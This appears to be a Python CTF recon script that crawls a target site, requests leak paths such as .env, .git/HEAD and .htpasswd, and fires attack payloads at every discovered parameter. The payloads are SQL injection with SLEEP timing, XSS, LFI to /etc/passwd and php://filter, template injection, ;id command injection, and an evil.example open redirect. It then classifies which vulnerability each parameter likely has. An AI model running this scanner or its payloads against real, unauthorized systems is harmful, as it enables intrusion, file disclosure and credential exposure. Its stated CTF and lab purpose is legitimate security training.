#!/usr/bin/env python3
"""auto_web.py [url] [cookie]  — web recon + active vuln classifier.

Recon (headers, leaks, JS, forms, params), fingerprints the stack, then probes every
discovered parameter with representative payloads from each PayloadsAllTheThings class
and prints WHICH AREA it likely is (SQLi / XSS / LFI / SSTI / cmdi / redirect / SSRF / ...).

Authorized CTF / lab targets only.   pip install requests
"""
import sys, os, re, time, warnings
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl, urlsplit
import requests
warnings.filterwarnings("ignore")

_FR = os.environ.get("FLAG_REGEX") or (
    re.escape(os.environ["FLAG_PREFIX"]) + r"\{[^}]{1,120}\}"
    if os.environ.get("FLAG_PREFIX") else r"[A-Za-z0-9_]{2,}\{[^}]{1,120}\}")

arg = sys.argv[1] if len(sys.argv) > 1 else input("[?] url (http://host/): ").strip()
if not arg:
    sys.exit("no url")
BASE = arg if "://" in arg else "http://" + arg
HOST = urlparse(BASE).hostname
S = requests.Session(); S.verify = False
S.headers["User-Agent"] = "Mozilla/5.0 (CTF recon)"
if len(sys.argv) > 2:
    S.cookies.set("session", sys.argv[2], domain=HOST)

FLAG = re.compile(_FR)
MARK = "zqx7"                                   # unique reflection marker
flags, signals = set(), set()

# ---------- PayloadsAllTheThings-style probe matrix ----------
SQL_ERR = re.compile(r"(SQL syntax|mysql_fetch|mysqli?|ORA-\d{5}|SQLSTATE|SQLite3?::|"
                     r"PostgreSQL.*ERROR|Unclosed quotation|quoted string not properly|"
                     r"Microsoft OLE DB|ODBC Driver|Warning: pg_)", re.I)
# trimmed to the most telling payloads per class (probe breaks on first confirm) to keep
# request volume — and rate-limit exposure — low.
PROBES = {
    "SQL Injection": {"vals": ["'", "1' AND SLEEP(4)-- -"], "sqli": True},
    "Cross-Site Scripting (XSS)": {"vals": [f"<svg/onload=alert(1)>{MARK}"],
                                   "reflect": f"<svg/onload=alert(1)>{MARK}"},
    "File Inclusion (LFI)": {"vals": ["../../../../../../etc/passwd",
                                      "php://filter/convert.base64-encode/resource=index.php"],
                             "match": re.compile(r"root:.*?:0:0:|PD9waHA")},
    "Server Side Template Injection": {"vals": ["{{7*7}}", "${7*7}"], "ssti": True},
    "Command Injection": {"vals": [";id", "|id", "`id`"],
                          "match": re.compile(r"uid=\d+\(|[\w-]+\\[\w.]+\s*$")},
    "Open Redirect": {"vals": ["//evil.example"], "redirect": "evil.example"},
}
SSRF_PARAMS = {"url", "uri", "next", "dest", "redirect", "redir", "return", "returnurl", "continue",
               "path", "file", "page", "host", "port", "to", "out", "view", "dir", "show", "img", "src",
               "callback", "domain", "feed", "site", "html", "val", "target", "load"}


def hitscan(label, text):
    for m in FLAG.findall(text):
        flags.add(m)


# ---- rate-limit-safe request layer ----
DELAY = float(os.environ.get("WEB_DELAY", "0.4"))      # min seconds between requests
MAXRETRY = int(os.environ.get("WEB_MAX_RETRIES", "4"))  # retries on 429/503 (backoff)
BUDGET = int(os.environ.get("WEB_BUDGET", "400"))       # hard cap on total requests/run
_last = [0.0]; _count = [0]; _stop = [False]


def _throttle():
    dt = time.time() - _last[0]
    if dt < DELAY:
        time.sleep(DELAY - dt)
    _last[0] = time.time()


def _core(method, url, **kw):
    """Throttled request with 429/503 backoff (honors Retry-After) and a global budget."""
    if _stop[0] or _count[0] >= BUDGET:
        if not _stop[0]:
            print(f"    [~] request budget {BUDGET} reached — stopping probes (raise WEB_BUDGET)")
        _stop[0] = True
        return "BUDGET", 0.0
    timeout = kw.pop("timeout", 12)
    for attempt in range(MAXRETRY + 1):
        _throttle()
        try:
            t0 = time.time()
            r = S.request(method, url, timeout=timeout, allow_redirects=False, **kw)
        except requests.exceptions.ReadTimeout:
            return "TIMEOUT", timeout
        except Exception:
            time.sleep(min(2 ** attempt, 8)); continue        # connection hiccup -> backoff+retry
        _count[0] += 1
        if r.status_code in (429, 503):
            ra = r.headers.get("Retry-After", "")
            wait = float(ra) if ra.isdigit() else min(2 ** attempt + 1, 20)
            if attempt == 0:
                print(f"    [~] HTTP {r.status_code} rate-limit; backing off {wait:.0f}s "
                      f"(raise WEB_DELAY to go slower)")
            time.sleep(wait); continue
        return r, time.time() - t0
    return "RATELIMIT", 0.0


def get(url, **kw):
    r, _ = _core("GET", url, **kw)
    return r if hasattr(r, "text") else None


def send(method, url, params=None, data=None, timeout=12):
    return _core(method, url, params=params, data=data, timeout=timeout)


# ---------- 1. recon ----------
print(f"[*] GET {BASE}")
r = get(BASE)
if r is None:
    sys.exit("[-] host unreachable")
print(f"    {r.status_code}  server={r.headers.get('Server')}  x-powered-by={r.headers.get('X-Powered-By')}")
hitscan("index", r.text)
# fingerprint
fp = []
blob = (r.text + str(r.headers)).lower()
for tech, sig in {"PHP": "php", "ASP.NET": "asp.net", "Express/Node": "express",
                  "Flask/Jinja": "werkzeug", "Django": "csrftoken", "Laravel": "laravel_session",
                  "WordPress": "wp-content", "Spring": "jsessionid", "GraphQL": "graphql"}.items():
    if sig in blob:
        fp.append(tech)
if fp:
    print("    stack:", ", ".join(fp))
for sec in ("Content-Security-Policy", "X-Frame-Options"):
    if sec not in r.headers:
        print(f"    [.] missing header {sec}")

print("[*] leaked / interesting paths:")
for p in (".git/HEAD", ".env", "robots.txt", "backup.zip", "config.php.bak", "admin/",
          "flag.txt", "api/", "graphql", "swagger.json", "phpinfo.php", ".htpasswd"):
    rr = get(urljoin(BASE, p))
    if rr is not None and rr.status_code not in (404, 403) and rr.text.strip():
        print(f"    [{rr.status_code}] {p} ({len(rr.text)}b)")
        hitscan(p, rr.text)
        if p in ("graphql", "api/"):
            signals.add("GraphQL / API")

# ---------- 2. collect endpoints, params, forms ----------
endpoints = {}          # url -> set(params)   (GET)
forms = []              # (action, method, {field:type})
pages = [BASE]
for src in re.findall(r'<script[^>]+src=["\']([^"\']+)', r.text):
    t = get(urljoin(BASE, src))
    if t is not None:
        hitscan(src, t.text)
# same-host links -> harvest query params (depth 1)
for href in set(re.findall(r'href=["\']([^"\']+)', r.text))[:40]:
    u = urljoin(BASE, href)
    if urlparse(u).hostname == HOST:
        q = dict(parse_qsl(urlsplit(u).query))
        if q:
            endpoints.setdefault(urlsplit(u)._replace(query="").geturl(), set()).update(q)
# forms
for f in re.findall(r"<form.*?</form>", r.text, re.S | re.I):
    action = urljoin(BASE, (re.search(r'action=["\']([^"\']*)', f) or [None, BASE])[1] or BASE)
    method = (re.search(r'method=["\']?(\w+)', f, re.I) or [None, "get"])[1].lower()
    fields = {}
    for inp in re.findall(r"<(?:input|textarea|select)[^>]*>", f, re.I):
        nm = (re.search(r'name=["\']([^"\']+)', inp) or [None, None])[1]
        ty = (re.search(r'type=["\']([^"\']+)', inp) or [None, "text"])[1].lower()
        if nm:
            fields[nm] = ty
    if fields:
        forms.append((action, method, fields))
        if any(t == "password" for t in fields.values()):
            signals.add("Authentication / login (try default creds, SQLi bypass, JWT)")
        if any(t == "file" for t in fields.values()):
            signals.add("File Upload (extension/magic-byte bypass, path traversal)")

if any(c.name.lower() in ("jwt", "token", "access_token") or
       (c.value or "").startswith("eyJ") for c in S.cookies):
    signals.add("JWT (alg:none / weak secret — jwt_tool)")

print(f"[*] endpoints with params: {len(endpoints)}   forms: {len(forms)}")


# ---------- 3. active probe each parameter ----------
def classify_param(name, baseurl, method, basefields):
    """Return list of likely-area strings for one parameter."""
    findings = []
    if name.lower() in SSRF_PARAMS:
        findings.append("SSRF / Open-Redirect candidate (url-like param)")
    if re.fullmatch(r"id|.*_?id|pid|uid|num|no", name.lower()):
        findings.append("IDOR / SQLi candidate (identifier param)")

    def fire(val):
        if method == "get":
            return send("GET", baseurl, params={**{k: "1" for k in basefields}, name: val})
        return send("POST", baseurl, data={**{k: "1" for k in basefields}, name: val})

    if _stop[0]:
        return findings
    base_r, base_t = fire("1")
    btext = base_r.text if hasattr(base_r, "text") else ""
    for area, cfg in PROBES.items():
        if _stop[0]:
            break
        for val in cfg["vals"]:
            r2, t2 = fire(val)
            if not hasattr(r2, "text"):          # None / TIMEOUT / BUDGET / RATELIMIT
                if r2 == "TIMEOUT" and cfg.get("sqli") and "SLEEP" in val:
                    findings.append(f"{area} — TIME-BASED blind (SLEEP delayed response)")
                if r2 == "BUDGET":
                    return findings
                continue
            txt = r2.text
            hitscan(name, txt)
            if cfg.get("sqli") and SQL_ERR.search(txt) and not SQL_ERR.search(btext):
                findings.append(f"{area} — ERROR-BASED (db error on quote)"); break
            if cfg.get("sqli") and "SLEEP" in val and t2 > base_t + 3:
                findings.append(f"{area} — TIME-BASED blind"); break
            if "reflect" in cfg and cfg["reflect"] in txt:
                findings.append(f"{area} — REFLECTED unescaped"); break
            if "match" in cfg and cfg["match"].search(txt) and not cfg["match"].search(btext):
                findings.append(f"{area} — CONFIRMED (payload output present)"); break
            if cfg.get("ssti") and "49" in txt and "{{7*7}}" not in txt and "49" not in btext:
                findings.append(f"{area} — template evaluated 7*7=49"); break
            if "redirect" in cfg and r2.status_code in (301, 302, 303, 307, 308) \
               and cfg["redirect"] in (r2.headers.get("Location", "")):
                findings.append(f"{area} — Location honors attacker host"); break
    return findings


print("\n=== PARAMETER PROBE (area classification) ===")
tested = 0
for url, params in list(endpoints.items())[:15]:
    for p in list(params)[:8]:
        tested += 1
        res = classify_param(p, url, "get", params)
        tag = "  ".join(res) if res else "no obvious injection (try sqlmap/ffuf manually)"
        print(f"  GET  {url}  param '{p}'  -> {tag}")
for action, method, fields in forms[:10]:
    for p in list(fields)[:8]:
        tested += 1
        res = classify_param(p, action, method, fields)
        tag = "  ".join(res) if res else "no obvious injection"
        print(f"  {method.upper():4} {action}  field '{p}'  -> {tag}")
if not tested:
    print("  (no params/forms found — dirbust first: ffuf -u %sFUZZ -w %s)"
          % (BASE, os.environ.get("DIRLIST", "/usr/share/wordlists/common.txt")))

# ---------- 4. summary ----------
print("\n=== LIKELY AREA(S) ===")
for s in sorted(signals):
    print("  -", s)
if not signals:
    print("  (no strong tech signal; rely on the param probe above)")
print("\n=== FLAGS ===")
print("\n".join(sorted(flags)) or "(none yet)")
print(f"\n[i] {_count[0]} requests sent @ {DELAY}s spacing"
      + ("  — stopped at WEB_BUDGET; raise it to probe more" if _stop[0] else ""))
print("[ref] deep-dive payloads: github.com/swisskyrepo/PayloadsAllTheThings  (per-area folders)")
